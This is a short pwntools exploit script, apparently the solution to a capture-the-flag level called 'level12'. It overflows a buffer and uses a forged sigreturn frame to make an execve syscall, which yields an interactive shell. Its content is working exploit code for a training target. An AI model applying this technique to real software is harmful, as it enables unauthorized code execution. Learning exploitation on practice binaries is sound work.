from pwn import *
context.update(os='linux', arch='i386')
offset = 8

DEBUG = False    
gs = '''
b *gadgets + 10
set context-sections disasm stack
continue
'''
if DEBUG:
    r = gdb.debug("./level12", gdbscript = gs)
else:
    r = process("./level12")

elf = ELF("./level12")

payload = cyclic(offset) + p32(elf.sym.gadgets + 4) + p32(elf.sym.gadgets + 10 )
r.send(payload)
frame = SigreturnFrame(kernel = "amd64")
frame.eax = 11
frame.ebx = elf.sym.idk
frame.eip = elf.sym.gadgets + 10
payload = bytes(frame)
r.sendline(payload)

r.interactive()